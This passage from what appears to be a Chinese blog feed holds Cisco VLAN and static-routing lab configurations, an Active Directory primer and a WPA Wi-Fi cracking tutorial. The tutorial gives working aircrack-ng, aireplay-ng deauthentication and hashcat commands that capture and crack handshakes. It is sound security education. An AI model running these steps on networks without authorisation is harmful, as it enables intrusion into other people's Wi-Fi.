src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/远程管理bj-sw.png" alt="远程管理bj-sw"></center></li><li><p>PC5远程管理bj-R操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/远程管理bj-R.png" alt="远程管理bj-R"></center></li></ol><h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ol><li>vlan20必须在tj-sw1中配置，否则PC2无法获取IP地址</li><li>DHCP跨VLAN分配IP必须配置DHCP中继</li></ol><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>tj-sw1:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname tj-sw1vlan 100vlan 10vlan 20exitint f0/1switchport mode access switchport access vlan 100int f0/2switchport mode accessswitchport access vlan 10int f0/3switchport mode trunkswitchport trunk allowed vlan allint range f0/4-6switchport mode trunkswitchport trunk allowed vlan allchannel-group 1 mode onexline vty 0 4pass ciscologinexitenable pass ciscoint vlan 10ip add 192.168.10.2 255.255.255.0no shexip default-gateway 192.168.20.1</code></pre><p>tj-sw2:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname tj-sw2vlan 10vlan 20exitint f0/1switchport mode access switchport access vlan 20int f0/2switchport mode accessswitchport access vlan 10int range f0/4-6switchport mode trunkswitchport trunk allowed vlan allchannel-group 1 mode onexline vty 0 4pass ciscologinexitenable pass ciscoint vlan 10ip add 192.168.10.3 255.255.255.0no shexip default-gateway 192.168.20.1</code></pre><p>tj-R:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname tj-Rint s1/0ip add 223.221.159.1 255.255.255.0clock rate 9600no shint f0/0.1encapsulation dot1Q 100ip add 192.168.10.1 255.255.255.0no ship helper-address 192.168.10.254int f0/0.2encapsulation dot1Q 10ip add 192.168.20.1 255.255.255.0no ship helper-address 192.168.10.254int f0/0.3encapsulation dot1Q 20ip add 192.168.30.1 255.255.255.0no sh ip helper-address 192.168.10.254int f0/0no shexrouter ripversion 2network 192.168.10.0network 192.168.20.0network 192.168.30.0network 223.221.159.0exline vty 0 4pass ciscologinexitenable pass cisco</code></pre><p>ISP-A:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname ISP-Bint f0/0ip add 111.111.111.1 255.255.255.0no shint f0/1ip add 11.11.11.1 255.255.255.0no shint s1/0ip add 223.221.159.2 255.255.255.0no shexroute ripversion 2network 223.221.159.0network 111.111.111.0network 11.11.11.0</code></pre><p>ISP-B:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname ISP-Bint f0/0ip add 222.222.222.1 255.255.255.0no shint f0/1ip add 11.11.11.2 255.255.255.0no shint s1/0ip add 223.11.115.1 255.255.255.0clock rate 9600no shexroute ripversion 2network 11.11.11.0network 222.222.222.0network 223.11.115.0</code></pre><p>bj-R:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname bj-Rint f0/0.1encapsulation dot1Q 100ip add 192.168.100.1 255.255.255.0no shint f0/0.2encapsulation dot1Q 200ip add 192.168.101.1 255.255.255.0no shint f0/0no shint s1/0ip add 223.11.115.2 255.255.255.0no shexip dhcp pool vlan100network 192.168.100.0 255.255.255.0default-router 192.168.100.1dns-server 222.222.222.222exip dhcp excluded-address 192.168.100.1 192.168.100.10ip dhcp pool vlan200network 192.168.101.0 255.255.255.0default-router 192.168.101.1dns-server 222.222.222.222exip dhcp excluded-address 192.168.101.1 192.168.101.10route ripversion 2network 223.11.115.0network 192.168.100.0network 192.168.101.0exline vty 0 4pass ciscologinexitenable pass cisco</code></pre><p>bj-sw:</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookupline console 0exec-timeout 0 0logging synexithostname bj-swvlan 100vlan 200exitint f0/1switchport mode accessswitchport access vlan 100int f0/2switchport mode accessswitchport access vlan 200int f0/3switchport mode trunkswitchport trunk allowed vlan allexline vty 0 4pass ciscologinexitenable pass ciscoint vlan 100ip add 192.168.100.2 255.255.255.0no shexip default-gateway 192.168.100.1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cisco </tag>
            
            <tag> VALN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无线安全之WPA密码破解</title>
      <link href="/2020/11/18/wu-xian-an-quan-zhi-wpa-mi-ma-po-jie/"/>
      <url>/2020/11/18/wu-xian-an-quan-zhi-wpa-mi-ma-po-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="无线网络标准"><a href="#无线网络标准" class="headerlink" title="无线网络标准"></a>无线网络标准</h1><p>​        IEEE802.11是无线局域网通用的标准，它是由IEEE国际化标准组织所定义的无线网络通信的标准。其中用于WiFi的标准主要有以下5种。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/802.11无线标准.jpg" alt="802.11无线标准"></center><ul><li>其中b/g/n为2.4GHz频段，a/ac为5GHz频段 </li></ul><p>由于无线网络的特殊性，传输的数据可以被范围内所有开启了<code>monitor</code>模式的无线设备所接收，所以国际标准化组织针对网络传输中的数据指定了一系列的加密传输标准：WEP、WPA、WPA2等。</p><h1 id="无线网卡工作模式"><a href="#无线网卡工作模式" class="headerlink" title="无线网卡工作模式"></a>无线网卡工作模式</h1><ul><li><strong>Managed</strong> （被管理，即你的无线网卡处于被管理的模式）模式：<font color="blue">该模式用于你的无线客户端直接与无线接入点（Access Point，即AP）进行接入连接</font>。在这个模式中，我们可以进行无线接入Internet上网，无线网卡的驱动程序依赖无线AP管理整个通信过程。</li><li><strong>Master</strong> （主模式，即你的无线网卡充当AP）模式：一些无线网卡支持Master模式。这个模式<font color="blue">允许无线网卡使用特制的驱动程序和软件工作，作为其他设备的无线AP</font>。它主要使用于无线接入点AP提供无线接入服务以及路由功能。比如无线路由器就是工作在Master模式下了，对于普通的PC机来说，如果有合适的硬件它也可以变成一台无线AP。</li><li><strong>Ad hoc</strong>（对等，点对点）模式：当你的网络由互相直连的设备组成时，就使用这个模式。在这个模式中，<font color="blue">各设备之间采用对等网络的方式进行连接，无线通信双方共同承担无线AP的职责</font>。</li><li><strong>Monitor</strong>（监视） 模式：Monitor模式主要用于监控无线网络内部的流量，用于检查网络和排错。要使Wireshark捕获无线数据包，你的无线网卡和配套驱动程序必须支持监听模式（也叫RFMON模式，（<code>Radio Frequency MONitor</code>，射频监视器））。Monitor模式是指<a href="http://zh.wikipedia.org/wiki/无线网络" target="_blank" rel="noopener">无线</a><a href="http://zh.wikipedia.org/wiki/网卡" target="_blank" rel="noopener">网卡</a>可以接收所有经过它的数据流的工作方式。监听模式不区分所接收<a href="http://zh.wikipedia.org/wiki/資料包" target="_blank" rel="noopener">数据包</a>的目标<a href="http://zh.wikipedia.org/wiki/MAC地址" target="_blank" rel="noopener">MAC地址</a>，这点和<a href="http://zh.wikipedia.org/wiki/混杂模式" target="_blank" rel="noopener">混杂模式</a>类似。然而，和混杂模式不同的是，监听模式的不需要和<a href="http://zh.wikipedia.org/wiki/無線接取器" target="_blank" rel="noopener">无线接入点</a>（AP）或Ad-hoc网络建立连接。监听模式是无线网卡特有的特殊模式，而混杂模式应用于有线网卡和无线网卡。监听模式通常用于网络发现、流量监听和<a href="http://zh.wikipedia.org/wiki/嗅探" target="_blank" rel="noopener">分组分析</a>。<a href="http://zh.wikipedia.org/wiki/Linux" target="_blank" rel="noopener">Linux</a>、<a href="http://zh.wikipedia.org/wiki/OS_X" target="_blank" rel="noopener">Mac、OS X</a>、<a href="http://zh.wikipedia.org/wiki/Windows" target="_blank" rel="noopener">Windows</a>以及其他<a href="http://zh.wikipedia.org/wiki/类Unix系统" target="_blank" rel="noopener">Unix-like</a>平台有使用监听模式的网络发现、抓包工具，如<a href="http://zh.wikipedia.org/w/index.php?title=KisMAC&action=edit&redlink=1" target="_blank" rel="noopener">KisMAC</a>、<a href="http://zh.wikipedia.org/w/index.php?title=Kismet&action=edit&redlink=1" target="_blank" rel="noopener">Kismet</a>、<a href="http://zh.wikipedia.org/wiki/Wireshark" target="_blank" rel="noopener">Wireshark</a>、<a href="http://zh.wikipedia.org/w/index.php?title=Aircrack-ng&action=edit&redlink=1" target="_blank" rel="noopener">Aircrack-ng</a>等。</li></ul><h1 id="无线攻击类型"><a href="#无线攻击类型" class="headerlink" title="无线攻击类型"></a>无线攻击类型</h1><ul><li>MAC地址绑定攻击</li><li><strong>WPA暴力破解</strong><ul><li>抓握手包</li><li>跑包</li></ul></li><li>WPS破解<ul><li>跑PIN</li></ul></li><li>钓鱼WiFi</li><li>KRACK密钥重装攻击</li></ul><h1 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h1><ul><li><strong>无线网卡选取</strong>。主机默认配置的无线网卡可能不支持Monitor模式和AP模式，因此我们需要另外选择无线网卡来进行辅助。</li><li><strong>工具选取</strong>。对于无线破解有很多的工具<code>aircrack-ng</code>、<code>Reaver</code>、<code>Pixiewps</code>、<code>wifite</code>等。在Kali系统中也集成了一些无线破解工具。</li></ul><h1 id="实践阶段"><a href="#实践阶段" class="headerlink" title="实践阶段"></a>实践阶段</h1><ol><li><p><strong>检查无线设备连接</strong>。连接好网卡后，使用<code>ifconfig</code>命令查看所有网卡设备，其中<code>wlan</code>即为无线设备，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/查看系统中的无线设备.png" alt="查看系统中的无线设备"></center></li><li><p><strong>检查无线网卡工作模式</strong>。使用<code>iwconfig</code>命令查看无线网卡当前的模式，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/查看无线网卡当前模式.png" alt="查看无线网卡当前模式"></center></li><li><p><strong>修改无线网卡MAC地址</strong>。使用<code>macchanger mac 00:11:22:33:44:55</code>命令修改网卡的MAC地址，在修改网卡地址之前需要先使用<code>ifconfig wlan0 down</code>命令将无线网卡关闭，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/修改网卡MAC地址.png" alt="修改网卡MAC地址"></center></li><li><p><strong>设置无线网卡为监听模式</strong>。使用如下所示命令开启无线网卡的监听模式，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">airmon-ng check killairmon-ng start wlan0</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/开启网卡监听端口.png" alt="开启网卡监听端口"></center></li><li><p><strong>查看周围网络</strong>。使用<code>airodump-ng wlan0</code>命令查看周围的无线网络，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/查看周围无线网络1.png" alt="查看周围无线网络"></center></li><li><p><strong>侦听指定信道</strong>。使用<code>airodump-ng -c 1 -w wpa wlan0</code>命令监听信道1并将监听的数据保存到wap命令的文件中，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/侦听信道1并保存数据.png" alt="侦听信道1并保存数据"></center></li><li><p><strong>捕获握手包</strong>。当客户端进行认证时，正在进行的客户端会捕获到握手包（<code>handshark</code>），显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/捕获握手包.png" alt="捕获握手包"></center><p>若监听中没有主机连接或监听之前主机已完成连接，此时不再进行握手，因此需要使用<code>aireplay-ng -0 5 -a E0:F4:42:1D:1C:94 -c 8A:70:4E:7F:53:D7 wlan0</code>命令强制主机重新握手从而抓找握手包，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/强制重新握手.png" alt="强制重新握手"></center></li><li><p><strong>密码破解</strong>。使用<code>aircrack-ng -w top100.txt wpa-01.cap</code>命令，进行密码破解，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/选择破解的BSSID.png" alt="选择破解的BSSID"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/WPA破解成功.png" alt="WPA破解成功"></center></li></ol><h1 id="踩坑填坑"><a href="#踩坑填坑" class="headerlink" title="踩坑填坑"></a>踩坑填坑</h1><ul><li><p>使用<code>airmon-ng start wlan0</code>设置监听模式名称还是<code>wlan0</code>而不是<code>wlan0mon</code>。</p><p>网络中好些教程中在开启监听模式后网卡变成了<code>wlan0mon</code>，但是我在复现的时候网卡名称还是<code>wlan0</code>，此处不需要太多纠结，只要使用<code>iwconfig</code>命令查看网卡模式是否为Monitor，名字什么的都不重要。</p></li><li><p>使用<code>airodump-ng -c 1 -w wpa --bssid xxxx wlan0</code>命令捕获不到在线客户端。</p><p>首先需要确定信道和BSSID是否设置正确，若设置没有问题可能是当前WiFi没有设备连接，要不等待要不换一棵树。</p></li><li><p>使用<code>airmon-ng check kill</code>结束其他程序使用无线网卡，那破解完成之后如何恢复。</p><p>使用<code>systemctl start NetworkManager</code>命令重新开启网络管理器进程。</p></li><li><p>使用<code>airmon-ng stop wlan0</code>关闭监听模式无效。</p><p>不知道为什么<code>airmon-ng</code>关闭无效，所以这里使用<code>iwconfig wlan0 mode manager</code>命令修改网卡的监听模式，但是注意在使用<code>iwconfig</code>命令时先使用<code>ifconfig wlan0 down</code>关闭网卡才能执行成功。</p></li></ul><h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>​        hashcat是一个性能超强的爆破工具，<code>aircrack-ng+hashcat</code>可以节省爆破时间，但airodump-ng捕获的握手包默认情况下后缀为<code>cap</code>，而hashcat只能破解<code>hccapx</code>后缀的文件，因此需要先将<code>cap</code>转换成<code>hccapx</code>后缀。</p><ol><li><p>使用<code>aircrack-ng wpa-01.cap -j nova</code>命令将<code>wpa-01.cap</code>转换为<code>wpa-01.hccapx</code>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/cap转hccapx.png" alt="cap转hccapx"></center></li><li><p>使用<code>hashcat</code>破解破解握手包，操作结果如下图所示。</p><pre class=" language-powershell"><code class="language-powershell">hashcat<span class="token punctuation">.</span>exe <span class="token operator">-</span>m 2500 <span class="token operator">-</span>D 2 C:\Users\yushe\Desktop\nova<span class="token punctuation">.</span>hccapx D:\Rolan\Tools\Dicts\top100<span class="token punctuation">.</span>txt</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Wireless/CrackPasswordOfWPA/hashcat破解.png" alt="hashcat破解"></center></li></ol><h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ul><li><a href="https://blog.csdn.net/fuhanghang/article/details/104436299" target="_blank" rel="noopener">无线网卡的工作模式</a></li><li><a href="https://github.com/aircrack-ng/aircrack-ng" target="_blank" rel="noopener">aircrack-ng源码</a></li><li><a href="https://blog.csdn.net/qq_41973154/article/details/88665107" target="_blank" rel="noopener">Linux中GUI图形nmtui问题及网卡问题</a></li><li><a href="https://www.jianshu.com/p/cf54288f789b" target="_blank" rel="noopener">Aircrack-ng 和 Hashcat的简单使用（握手包破解wifi）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 无线安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WiFi </tag>
            
            <tag> WPA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态路由综合实验</title>
      <link href="/2020/11/18/jing-tai-lu-you-zong-he-shi-yan/"/>
      <url>/2020/11/18/jing-tai-lu-you-zong-he-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/静态路由综合实验.png" alt="静态路由综合实验"></center><h1 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h1><ul><li>DHCP-Server为<code>192.168.10.0</code>网段中的网络设置分配IP地址、子网掩码、默认网关、首选DNS服务器。</li><li>DNS-Server为网络中的DNS服务器提供域名解析服务。</li><li>Web-Server是网络中的Web服务器，网络中的主机可以访问其上面的网站。</li><li>PC1的IP地址设置为自动获取由DHCP-Server服务器分配。</li><li>网络中的路由器除了设置IP地址之外还需要设置静态路由。</li><li><code>tj-sw</code>和<code>tj-router</code>需要开启远程管理功能。</li></ul><h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="0x01-配置DHCP-Server"><a href="#0x01-配置DHCP-Server" class="headerlink" title="0x01 配置DHCP-Server"></a>0x01 配置DHCP-Server</h2><ol><li><p>打开DHCP-Server配置界面，在【Desktop】选项卡中对服务器的IP地址进行设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/DHCP-ServerIP设置.png" alt="DHCP-ServerIP设置"></center></li><li><p>在Services选项卡中对DHCP模块进行设置，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/DHCP服务设置.png" alt="DHCP服务设置"></center></li><li><p>打开PC1配置界面，在Desktop选项卡中将IP设置为通过DHCP获取，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/PC1自动获取IP地址.png" alt="PC1自动获取IP地址"></center></li></ol><h2 id="0x02-配置tj-router"><a href="#0x02-配置tj-router" class="headerlink" title="0x02 配置tj-router"></a>0x02 配置tj-router</h2><p>打开tj-router的配置界面，在CLI选项卡中设置路由器的IP地址、和路由信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/tj-router配置.png" alt="tj-router配置"></center><h2 id="0x03-配置ISP"><a href="#0x03-配置ISP" class="headerlink" title="0x03 配置ISP"></a>0x03 配置ISP</h2><p>打开ISP的配置界面，在CLI选项卡中设置路由器的IP地址、和路由信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/ISP配置.png" alt="ISP配置"></center><h2 id="0x04-配置ISP-Web"><a href="#0x04-配置ISP-Web" class="headerlink" title="0x04 配置ISP-Web"></a>0x04 配置ISP-Web</h2><p>打开ISP-Web的配置界面，在CLI选项卡中设置路由器的IP地址、和路由信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/ISP-Web配置.png" alt="ISP-Web配置"></center><h2 id="0x05-配置ISP-DNS"><a href="#0x05-配置ISP-DNS" class="headerlink" title="0x05 配置ISP-DNS"></a>0x05 配置ISP-DNS</h2><p>打开ISP-DNS的配置界面，在CLI选项卡中设置路由器的IP地址、和路由信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/ISP-DNS配置.png" alt="ISP-DNS配置"></center><h2 id="0x05-配置Web-Server"><a href="#0x05-配置Web-Server" class="headerlink" title="0x05 配置Web-Server"></a>0x05 配置Web-Server</h2><ol><li><p>打开Web Server配置界面，在【Desktop】选项卡中设置IP地址，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/Web-ServerIP配置.png" alt="Web-ServerIP配置"></center></li><li><p>在【Services】选项卡中设置Web服务器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/开启HTTP服务.png" alt="开启HTTP服务"></center></li></ol><h2 id="0x06-配置DNS-Server"><a href="#0x06-配置DNS-Server" class="headerlink" title="0x06 配置DNS-Server"></a>0x06 配置DNS-Server</h2><ol><li><p>打开DNS Server配置界面，在【Desktop】选项卡中设置IP地址，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/DNS-ServerIP配置.png" alt="DNS-ServerIP配置"></center></li><li><p>在【Services】选项卡中设置DNS服务器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/DNS服务配置.png" alt="DNS服务配置"></center></li></ol><h2 id="0x07-配置tj-sw"><a href="#0x07-配置tj-sw" class="headerlink" title="0x07 配置tj-sw"></a>0x07 配置tj-sw</h2><p>打开tj-sw的配置界面，在CLI选项卡中设置VLAN1的IP地址、默认网关，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/tj-sw配置.png" alt="tj-sw配置"></center><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><ul><li><p>PC1在浏览器中输入<code>www.bihuo.com</code>访问结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/访问网站显示结果.png" alt="访问网站显示结果"></center></li><li><p>PC1使用Telnet远程访问tj-router，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/远程访问tj-router.png" alt="远程访问tj-router"></center></li><li><p>PC1使用Telnet远程访问tj-sw，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/远程访问tj-sw.png" alt="远程访问tj-sw"></center></li><li><p>ISP-DNS使用Telnet远程访问tj-sw，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/StaticRoute/外网远程访问th-sw.png" alt="外网远程访问th-sw"></center></li></ul><h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p><strong>tj-router配置脚本</strong>：</p><pre class=" language-shell"><code class="language-shell">enconf thostname tj-routerno ip domain-lookupline console 0exec-timeout 0 0logging synint f0/0ip add 192.168.10.1 255.255.255.0no shint s1/0ip add 192.168.20.1 255.255.255.0clock rate 9600no shexip route 0.0.0.0 0.0.0.0 192.168.20.2line vty 0 4password ciscologinendwr</code></pre><p><strong>ISP配置脚本</strong>：</p><pre class=" language-shell"><code class="language-shell">enconf thostname ISPno ip domain-lookupline console 0exec-timeout 0 0logging synint s1/0ip add 192.168.20.2 255.255.255.0no shint s1/1ip add 192.168.30.1 255.255.255.0clock rate 9600no shint s1/2ip add 192.168.40.1 255.255.255.0clock rate 9600no shexip route 192.168.10.0 255.255.255.0 192.168.20.1ip route 192.168.100.0 255.255.255.0 192.168.30.2ip route 192.168.200.0 255.255.255.0 192.168.40.2endwr</code></pre><p><strong>ISP-Web配置脚本</strong>：</p><pre class=" language-shell"><code class="language-shell">enconf thostname ISP-Webno ip domain-lookupline console 0exec-timeout 0 0logging synint f0/0 ip add 192.168.100.1 255.255.255.0no shint s1/0ip add 192.168.30.2 255.255.255.0no shexip route 0.0.0.0 0.0.0.0 192.168.30.1endwr</code></pre><p><strong>ISP-DNS配置脚本</strong>：</p><pre class=" language-shell"><code class="language-shell">enconf thostname ISP-DNSno ip domain-lookupline console 0exec-timeout 0 0logging synint f0/0ip add 192.168.200.1 255.255.255.0no shint s1/0ip add 192.168.40.2 255.255.255.0no shexip route 0.0.0.0 0.0.0.0 192.168.40.1endwr</code></pre><p><strong>tj-sw配置脚本</strong>：</p><pre class=" language-shell"><code class="language-shell">enconf thostname tj-swno ip domain-lookupline console 0exec-timeout 0 0logging synint vlan1ip add 192.168.10.2 255.255.255.0 no shexip default-gateway 192.168.10.1line vty 0 4password ciscologinendwr</code></pre><p><font color="red">资源链接：<a href="https://pan.baidu.com/s/1Q_fLY90M-Dyha6Nza8ud0w" target="_blank" rel="noopener">https://pan.baidu.com/s/1Q_fLY90M-Dyha6Nza8ud0w</a><br>提取码：y91i<br></font></p>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 静态路由 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域和活动目录</title>
      <link href="/2020/11/16/yu-he-huo-dong-mu-lu/"/>
      <url>/2020/11/16/yu-he-huo-dong-mu-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="域概念"><a href="#域概念" class="headerlink" title="域概念"></a>域概念</h1><h2 id="什么是域"><a href="#什么是域" class="headerlink" title="什么是域"></a>什么是域</h2><p>​        逻辑上把网络中计算机组织在一起，集中化管理的一种环境。</p><ul><li>域是<strong>活动目录</strong>的一种实现形式。</li><li>域是活动目录中最核心的管理单位</li><li>域由域控制器和成员计算机组成</li></ul><h2 id="什么是活动目录"><a href="#什么是活动目录" class="headerlink" title="什么是活动目录"></a>什么是活动目录</h2><ul><li>是一个数据库：存储着整个Windows域中用户、组、计算机、共享文件夹等对象信息</li><li>是一种服务：能实现对数据对象的增、删、改、查等操作</li></ul><h2 id="域包含的成员"><a href="#域包含的成员" class="headerlink" title="域包含的成员"></a>域包含的成员</h2><ul><li><p>域控制器（DC）：安装了活动目录的一台计算机</p><ul><li>域控制器 → 成员服务器</li><li>域控制器 → 独立服务器</li><li>成员服务器 → 域控制器</li><li>独立服务器 → 域控制器</li></ul></li><li><p>成员计算机：加入了该域环境的计算机</p><ul><li>成员计算机 → 独立计算机</li><li>独立计算机 → 成员计算机</li></ul></li><li><p>成员服务器：加入了该域环境的服务器</p><ul><li>成员服务器 → 域控制器</li><li>成员服务器 → 独立服务器</li><li>域控制器 → 成员服务器</li><li>独立服务器 → 成员服务器</li></ul></li><li><p>独立服务器：工作组环境的服务器，没有加入到域</p><ul><li>独立服务器 → 域控制器</li><li>独立服务器 → 成员服务器</li><li>成员服务器 → 独立服务器</li><li>域控制器 → 成员服务器 → 独立服务器<h2 id="域的优点"><a href="#域的优点" class="headerlink" title="域的优点"></a>域的优点</h2></li></ul></li><li><p>集中管理</p></li><li><p>便捷的网络资源访问</p></li><li><p>可扩展性</p></li></ul><h2 id="域的结构"><a href="#域的结构" class="headerlink" title="域的结构"></a>域的结构</h2><ul><li>单域：网络中只有一个域 （最常见的管理方式）</li><li>域树：具有连续名称空间的多个域</li><li>域林：由一个或多个没有形成连续名称的域树组成</li></ul><h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><p>​        一组策略的集合，用来用来统一修改系统、设置程序（设置桌面环境、安全设置、自动执行脚本、软件分发）</p><h3 id="组策略优点"><a href="#组策略优点" class="headerlink" title="组策略优点"></a>组策略优点</h3><ol><li>减小管理成本：只需设置一次，相应的计算机或用户即可应用</li><li>减小用户单独配置错误的可能性</li><li>可以针对特定对象设置特定的策略（用户策略、计算机策略）</li></ol><h3 id="组策略对象（Group-Policy-Object）"><a href="#组策略对象（Group-Policy-Object）" class="headerlink" title="组策略对象（Group Policy Object）"></a>组策略对象（Group Policy Object）</h3><p>​        存储组策略的所有配置信息，AD中的一种特殊对象。</p><h4 id="默认GPO"><a href="#默认GPO" class="headerlink" title="默认GPO"></a>默认GPO</h4><ul><li><p>默认域策略:影响域中所有的用户和计算机</p></li><li><p>默认域控制器策略:影响组织单位“Domain Controllers”中所有的用户和计算机</p></li></ul><h3 id="组策略配置分类"><a href="#组策略配置分类" class="headerlink" title="组策略配置分类"></a>组策略配置分类</h3><ul><li>计算机配置<ul><li>只针对容器中的计算机生效</li><li>策略：<ul><li>软件设置</li><li>Windows设置</li><li>管理模板</li></ul></li><li>首选项<ul><li>Windows设置</li><li>控制面板设置</li></ul></li><li>配置完成重启客户端生效</li></ul></li><li>用户配置<ul><li>只针对容器中的用户生效</li><li>策略：<ul><li>软件设置</li><li>Windows设置</li><li>管理模板那</li></ul></li><li>首选项：<ul><li>Windows设置</li><li>控制面板设置</li></ul></li><li>配置完成重启客户端生效</li></ul></li></ul><h3 id="组策略应用规则"><a href="#组策略应用规则" class="headerlink" title="组策略应用规则"></a>组策略应用规则</h3><ul><li>策略继承：下级容器默认会继承来自上级容器的GPO</li><li>策略阻止：子容器可以阻止继承上级容器的GPO</li><li>策略累加：如果多个组策略设置不冲突，则最终的有效策略是所有组策略设置的累加</li><li>策略冲突：如果多个组策略设置冲突，则后应用的组策略覆盖先应用的组策略</li><li>策略强制生效：上级容器强制下级容器执行其GPO设置，“强制生效”会覆盖“阻止继承”设置</li></ul><h3 id="组策略应用顺序"><a href="#组策略应用顺序" class="headerlink" title="组策略应用顺序"></a>组策略应用顺序</h3><p>组策略应用顺序：LSDOU</p><ul><li>首先应用本地组策略，如果有站点组策略，则应用</li><li>接着应用域策略</li><li>最后应用OU上的策略</li><li>如果同一个OU上链接了多个GPO，则按照链接顺序从高到低逐个应用</li></ul><h1 id="域控制器的创建"><a href="#域控制器的创建" class="headerlink" title="域控制器的创建"></a>域控制器的创建</h1><h2 id="先决条件"><a href="#先决条件" class="headerlink" 